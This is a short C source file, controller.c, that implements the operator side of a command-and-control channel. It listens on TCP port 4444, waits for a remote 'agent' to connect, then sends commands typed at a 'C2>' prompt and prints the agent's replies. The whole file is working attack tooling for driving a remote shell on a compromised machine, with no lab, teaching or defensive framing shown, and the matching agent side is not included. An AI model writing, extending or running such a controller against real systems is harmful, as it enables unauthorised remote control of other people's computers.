// controller.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4444
#define BUF_SIZE 4096

int main() {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    char buffer[BUF_SIZE];

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 1);
    printf("[+] Waiting for agent on port %d...\n", PORT);

    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
    printf("[+] Agent connected from %s\n", inet_ntoa(addr.sin_addr));

    while (1) {
        printf("C2> ");
        fflush(stdout);
        if (!fgets(buffer, BUF_SIZE, stdin)) break;

        send(client_fd, buffer, strlen(buffer), 0);
        if (strncmp(buffer, "exit", 4) == 0) break;

        memset(buffer, 0, BUF_SIZE);
        recv(client_fd, buffer, BUF_SIZE - 1, 0);
        printf("%s", buffer);
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
